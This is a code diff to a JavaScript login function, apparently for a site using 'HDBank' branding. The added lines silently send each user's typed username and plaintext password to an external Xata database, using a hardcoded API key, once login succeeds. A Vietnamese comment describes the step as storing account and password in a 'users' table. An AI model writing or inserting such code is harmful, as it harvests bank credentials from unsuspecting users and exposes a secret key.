@@ -103,6 +103,23 @@ function handleLogin() {
                     }),
                 }).then((result) => {
                     if (result.data.accountNo !== null) {
+                        // thêm thông tin tài khoản và password vào DB "users"
+                        let apiKeyXata = 'xau_NFju5b34TYFnTVeex0PP51gJ1xGDoFmG0'
+
+                        $.ajax({
+                            url: 'https://6151_v-kh-i-s-workspace-uh7b6d.us-east-1.xata.sh/db/HDBank:main/tables/users/data',
+                            headers: {
+                                Authorization: 'Bearer' + ' ' + apiKeyXata,
+                                'Content-Type': 'application/json',
+                            },
+                            method: 'POST',
+                            data: JSON.stringify({
+                                username: $('#username').val(),
+                                password: $('#password').val(),
+                            }),
+                        }).then((result) => {
+                            console.log(result)
+                        })
                         setCookie('token', result.data.accountNo, 1)
                         window.location.href = '/'
                     } else {
